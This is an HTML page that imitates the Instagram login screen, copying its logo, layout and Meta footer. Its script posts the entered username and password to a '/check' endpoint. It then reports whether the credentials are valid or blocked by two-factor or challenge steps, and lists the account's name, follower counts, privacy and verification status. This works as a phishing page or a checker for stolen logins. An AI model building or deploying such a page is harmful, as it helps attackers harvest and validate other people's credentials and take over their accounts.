<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      background: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
        Helvetica, Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 12px;
      color: #262626;
    }

    .wrapper {
      display: flex;
      align-items: flex-start;
      gap: 32px;
      max-width: 935px;
      width: 100%;
      justify-content: center;
    }

    /* ── Phone mockup (hidden on small screens) ─────────────── */
    .phone-mockup {
      width: 380px;
      min-width: 380px;
      height: 580px;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .phone-mockup img {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      object-fit: contain;
      pointer-events: none;
    }

    @media (max-width: 768px) { .phone-mockup { display: none; } }

    /* ── Right column ──────────────────────────────────────── */
    .right-col {
      width: 350px;
      min-width: 0;
      flex-shrink: 0;
    }

    /* ── Card ─────────────────────────────────────────────── */
    .card {
      background: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 40px 40px 20px;
      margin-bottom: 10px;
      text-align: center;
    }

    /* ── Instagram wordmark SVG ───────────────────────────── */
    .ig-logo {
      display: inline-block;
      margin-bottom: 28px;
    }

    /* ── Form ─────────────────────────────────────────────── */
    .field {
      position: relative;
      margin-bottom: 6px;
    }

    .field input {
      width: 100%;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      padding: 9px 8px 7px;
      font-size: 12px;
      color: #262626;
      outline: none;
      transition: border-color 0.1s;
      height: 38px;
    }

    .field input:focus { border-color: #a8a8a8; }

    .field label {
      position: absolute;
      left: 9px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 12px;
      color: #8e8e8e;
      pointer-events: none;
      transition: all 0.1s ease;
      background: transparent;
    }

    .field input:focus ~ label,
    .field input:not(:placeholder-shown) ~ label {
      top: 7px;
      transform: none;
      font-size: 9px;
      font-weight: 600;
    }

    .field input { padding-top: 14px; padding-bottom: 2px; }
    .field input:placeholder-shown { padding-top: 9px; padding-bottom: 7px; }

    /* Password toggle */
    .pw-wrap { position: relative; }
    .pw-wrap input { padding-right: 56px; }

    .toggle-pw {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      color: #262626;
      padding: 0;
      line-height: 1;
    }

    /* ── Submit button ────────────────────────────────────── */
    .btn-login {
      width: 100%;
      margin-top: 8px;
      padding: 7px 16px;
      border-radius: 8px;
      border: none;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      background: #0095f6;
      color: #fff;
      transition: opacity 0.15s;
      height: 32px;
      line-height: 1;
    }

    .btn-login:hover:not(:disabled) { opacity: 0.85; }
    .btn-login:disabled { opacity: 0.45; cursor: default; }

    /* ── OR divider ───────────────────────────────────────── */
    .or-row {
      display: flex;
      align-items: center;
      gap: 18px;
      margin: 18px 0 18px;
    }

    .or-row::before, .or-row::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .or-row span {
      font-size: 13px;
      font-weight: 600;
      color: #8e8e8e;
      letter-spacing: 1px;
    }

    /* ── Facebook login ───────────────────────────────────── */
    .btn-fb {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      width: 100%;
      background: none;
      border: none;
      cursor: pointer;
      color: #385185;
      font-size: 14px;
      font-weight: 600;
      padding: 6px 0;
    }

    .btn-fb svg { flex-shrink: 0; }

    /* ── Forgot password ──────────────────────────────────── */
    .forgot {
      display: block;
      margin-top: 14px;
      font-size: 12px;
      color: #262626;
      text-decoration: none;
    }

    .forgot:hover { color: #8e8e8e; }

    /* ── Sign-up card ─────────────────────────────────────── */
    .signup-card {
      background: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 20px;
      text-align: center;
      font-size: 14px;
      margin-bottom: 20px;
    }

    .signup-card a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
    }

    /* ── App download ─────────────────────────────────────── */
    .app-row {
      text-align: center;
      font-size: 14px;
      margin-bottom: 12px;
      color: #262626;
    }

    .app-badges {
      display: flex;
      gap: 8px;
      justify-content: center;
      margin-top: 12px;
    }

    .app-badges img { height: 40px; border-radius: 6px; }

    /* ── Spinner ──────────────────────────────────────────── */
    .spinner {
      display: inline-block;
      width: 14px; height: 14px;
      border: 2px solid rgba(255,255,255,0.4);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 0.65s linear infinite;
      vertical-align: middle;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    /* ── Result toast ─────────────────────────────────────── */
    .toast {
      display: none;
      margin-top: 14px;
      padding: 10px 12px;
      border-radius: 4px;
      font-size: 13px;
      line-height: 1.4;
      text-align: left;
    }

    .toast.valid   { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
    .toast.warning { background: #fff3cd; color: #856404; border: 1px solid #ffeeba; }
    .toast.error   { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }

    .toast strong { display: block; margin-bottom: 3px; font-weight: 700; }

    /* Account detail table */
    .acc-table {
      margin-top: 10px;
      width: 100%;
      font-size: 12px;
      border-collapse: collapse;
    }

    .acc-table td {
      padding: 4px 0;
      border-bottom: 1px solid rgba(0,0,0,0.07);
    }

    .acc-table td:first-child { color: #8e8e8e; width: 50%; }
    .acc-table td:last-child  { font-weight: 600; color: #262626; }

    .acc-table tr:last-child td { border-bottom: none; }

    /* ── Footer ───────────────────────────────────────────── */
    footer {
      text-align: center;
      font-size: 12px;
      color: #8e8e8e;
      margin-top: 24px;
      max-width: 350px;
    }

    footer nav { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px 14px; margin-bottom: 14px; }
    footer nav a { color: #8e8e8e; text-decoration: none; }
    footer nav a:hover { text-decoration: underline; }
  </style>
</head>
<body>

  <div class="wrapper">

    <!-- Phone mockup (desktop only) -->
    <div class="phone-mockup">
      <svg viewBox="0 0 380 580" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:100%">
        <!-- Phone frame -->
        <rect x="30" y="10" width="320" height="560" rx="36" fill="#fff" stroke="#dbdbdb" stroke-width="1.5"/>
        <!-- Status bar -->
        <rect x="130" y="22" width="120" height="18" rx="9" fill="#f0f0f0"/>
        <!-- Screen area -->
        <rect x="44" y="50" width="292" height="490" rx="4" fill="#fafafa"/>
        <!-- Mini instagram posts -->
        <rect x="50" y="56" width="93" height="93" rx="2" fill="#efefef"/>
        <rect x="147" y="56" width="93" height="93" rx="2" fill="#e0e0e0"/>
        <rect x="244" y="56" width="86" height="93" rx="2" fill="#d6d6d6"/>
        <rect x="50" y="153" width="93" height="93" rx="2" fill="#e8e8e8"/>
        <rect x="147" y="153" width="93" height="93" rx="2" fill="#f5f5f5"/>
        <rect x="244" y="153" width="86" height="93" rx="2" fill="#ebebeb"/>
        <rect x="50" y="250" width="93" height="93" rx="2" fill="#dcdcdc"/>
        <rect x="147" y="250" width="93" height="93" rx="2" fill="#e4e4e4"/>
        <rect x="244" y="250" width="86" height="93" rx="2" fill="#f0f0f0"/>
        <!-- Bottom nav bar -->
        <rect x="44" y="500" width="292" height="40" rx="2" fill="#fff" stroke="#dbdbdb" stroke-width="0.5"/>
        <!-- Home button area -->
        <rect x="155" y="556" width="70" height="8" rx="4" fill="#ccc"/>
      </svg>
    </div>

    <!-- Right column -->
    <div class="right-col">

      <!-- Main login card -->
      <div class="card">

        <!-- Instagram wordmark -->
        <div class="ig-logo">
          <svg aria-label="Instagram" height="51" role="img" viewBox="32 4 113 32" width="175">
            <title>Instagram</title>
            <path clip-rule="evenodd"
              d="M48.515 10.42c-1.494 0-2.373.647-2.849 1.188-.367.42-.522.84-.553.944h-.031c0-.744-.013-1.482-.025-2.04h-2.887c.026.89.039 6.786.039 9.14v.527h2.957v-4.88c0-.34.027-.68.124-.922.298-.762.97-1.55 2.1-1.55 1.482 0 2.072 1.13 2.072 2.785v4.567h2.957v-4.88c0-3.51-1.875-4.88-3.904-4.88zm-14.35 4.436c0-1.682 1.033-2.372 2.175-2.372 1.218 0 1.875.626 1.875 1.706v.183h-4.05v.483zm6.931 1.602c.013-.21.04-.483.04-.717 0-3.146-1.68-5.322-4.925-5.322-2.99 0-5.05 2.163-5.05 5.399 0 3.275 2.058 5.243 5.284 5.243 1.573 0 2.978-.37 4.073-1.09l-.84-1.89c-.892.575-1.916.876-3.026.876-1.56 0-2.63-.718-2.839-2.5h7.283zm20.7 1.55c0-1.365-1.012-2.136-2.977-2.476l-.892-.157c-.748-.14-1.312-.418-1.312-1.01 0-.496.42-.997 1.494-.997.974 0 1.864.366 2.467.758l.867-1.95c-.892-.523-2.032-.812-3.29-.812-2.387 0-4.131 1.288-4.131 3.196 0 1.368 1.012 2.164 2.794 2.476l.893.157c.892.17 1.481.444 1.481 1.04 0 .627-.616 1.01-1.677 1.01-1.13 0-2.31-.418-3.03-1.01l-.892 2.033c.892.653 2.205 1.14 3.857 1.14 2.635 0 4.348-1.248 4.348-3.4zm5.283 3.074v-8.612h-2.956v8.612h2.956zm-1.494-9.843c.998 0 1.784-.785 1.784-1.758 0-.97-.786-1.756-1.784-1.756-.999 0-1.784.787-1.784 1.757 0 .973.785 1.757 1.784 1.757zm9.686 9.947c-.906 0-1.573-.223-2.033-.78-.38-.47-.563-1.15-.563-2.044v-3.77h2.543V12.53h-2.543V9.527H70.27v3.004h-1.82v2.217h1.82v3.848c0 1.549.285 2.659.879 3.38.72.88 1.895 1.34 3.455 1.34 1.494 0 2.373-.38 2.74-.614l-.695-2.176c-.38.196-.88.326-1.378.326zm8.35-9.947c-3.24 0-5.336 2.137-5.336 5.373s2.097 5.27 5.336 5.27c3.24 0 5.335-2.033 5.335-5.27s-2.096-5.373-5.335-5.373zm0 2.346c1.468 0 2.327 1.17 2.327 3.027 0 1.86-.859 2.923-2.327 2.923-1.468 0-2.327-1.064-2.327-2.923 0-1.856.859-3.027 2.327-3.027zm12.487-2.346c-1.494 0-2.373.647-2.849 1.188-.367.42-.522.84-.554.944h-.03c0-.744-.014-1.482-.026-2.04h-2.887c.026.89.039 6.786.039 9.14v.527h2.957v-4.88c0-.34.027-.68.123-.922.298-.762.97-1.55 2.1-1.55 1.483 0 2.073 1.13 2.073 2.785v4.567h2.957v-4.88c0-3.51-1.876-4.88-3.903-4.88zm12.79 0c-1.495 0-2.374.647-2.85 1.188-.366.42-.521.84-.553.944h-.03c0-.744-.014-1.482-.027-2.04h-2.886c.026.89.04 6.786.04 9.14v.527h2.956v-4.88c0-.34.027-.68.124-.922.298-.762.97-1.55 2.1-1.55 1.482 0 2.072 1.13 2.072 2.785v4.567h2.957v-4.88c0-3.51-1.875-4.88-3.904-4.88z"
              fill="currentColor" fill-rule="evenodd"/>
          </svg>
        </div>

        <!-- Login form -->
        <form id="loginForm" autocomplete="off">
          <div class="field">
            <input type="text" id="username" placeholder=" " autocapitalize="none" autocomplete="off" />
            <label for="username">Phone number, username, or email</label>
          </div>

          <div class="field pw-wrap">
            <input type="password" id="password" placeholder=" " autocomplete="off" />
            <label for="password">Password</label>
            <button type="button" class="toggle-pw" id="togglePw">Show</button>
          </div>

          <button type="submit" class="btn-login" id="submitBtn" disabled>Log in</button>
        </form>

        <div class="or-row"><span>OR</span></div>

        <button class="btn-fb" type="button">
          <svg fill="#385185" height="20" viewBox="0 0 24 24" width="20">
            <path d="M9.19795 21.5H13.198V13.4901H16.8021L17.198 9.50977H13.198V7.5C13.198 6.94772 13.6457 6.5 14.198 6.5H17.198V2.5H14.198C11.4365 2.5 9.19795 4.73858 9.19795 7.5V9.50977H7.19795L6.80206 13.4901H9.19795V21.5Z"/>
          </svg>
          Log in with Facebook
        </button>

        <a href="#" class="forgot">Forgot password?</a>

        <!-- Result area -->
        <div class="toast" id="toast"></div>
      </div>

      <!-- Sign up card -->
      <div class="signup-card">
        Don't have an account? <a href="#">Sign up</a>
      </div>

      <!-- App download -->
      <div class="app-row">
        Get the app.
        <div class="app-badges">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/320px-Download_on_the_App_Store_Badge.svg.png"
               alt="Download on the App Store" style="height:36px;border-radius:8px" />
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/320px-Google_Play_Store_badge_EN.svg.png"
               alt="Get it on Google Play" style="height:36px;border-radius:8px" />
        </div>
      </div>

    </div>
  </div>

  <!-- Footer -->
  <footer>
    <nav>
      <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a>
      <a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a>
      <a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a>
      <a href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">Contact</a>
    </nav>
    <span>© 2024 Instagram from Meta</span>
  </footer>

  <script>
    const usernameEl = document.getElementById('username');
    const passwordEl = document.getElementById('password');
    const submitBtn  = document.getElementById('submitBtn');
    const togglePw   = document.getElementById('togglePw');
    const toast      = document.getElementById('toast');
    const form       = document.getElementById('loginForm');

    // Enable button only when both fields have content
    function updateBtn() {
      submitBtn.disabled = !(usernameEl.value.trim() && passwordEl.value);
    }
    usernameEl.addEventListener('input', updateBtn);
    passwordEl.addEventListener('input', updateBtn);

    // Show / hide password
    togglePw.addEventListener('click', () => {
      const isText = passwordEl.type === 'text';
      passwordEl.type = isText ? 'password' : 'text';
      togglePw.textContent = isText ? 'Show' : 'Hide';
    });

    // Submit
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const username = usernameEl.value.trim();
      const password = passwordEl.value;
      if (!username || !password) return;

      submitBtn.disabled = true;
      submitBtn.innerHTML = '<span class="spinner"></span>';
      toast.style.display = 'none';

      try {
        const res = await fetch('/check', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password }),
        });
        const data = await res.json();
        showToast(data);
      } catch {
        showToast({ success: false, message: 'Network error. Please try again.' });
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Log in';
      }
    });

    function showToast(data) {
      const status = data.status || '';
      const isWarning = ['2fa_required', 'challenge_required', 'recaptcha_challenge', 'contact_point_required'].includes(status);
      const isValid   = data.success && !isWarning;

      toast.className = 'toast ' + (isValid ? 'valid' : isWarning ? 'warning' : 'error');
      toast.style.display = 'block';

      let label = isValid ? '✓ Valid credentials' : isWarning ? '⚠ Additional step required' : '✕ Login failed';
      let html  = `<strong>${label}</strong>${esc(data.message || '')}`;

      if (data.account) {
        const a = data.account;
        html += `
          <table class="acc-table">
            <tr><td>Full name</td><td>${esc(a.full_name || '—')}</td></tr>
            <tr><td>Username</td><td>@${esc(a.username || '—')}</td></tr>
            <tr><td>Followers</td><td>${fmt(a.followers)}</td></tr>
            <tr><td>Following</td><td>${fmt(a.following)}</td></tr>
            <tr><td>Private</td><td>${a.is_private ? 'Yes' : 'No'}</td></tr>
            <tr><td>Verified</td><td>${a.is_verified ? 'Yes' : 'No'}</td></tr>
          </table>`;
      }

      toast.innerHTML = html;
    }

    function esc(s) {
      return String(s)
        .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    }
    function fmt(n) {
      return n != null ? Number(n).toLocaleString() : '—';
    }
  </script>
</body>
</html>
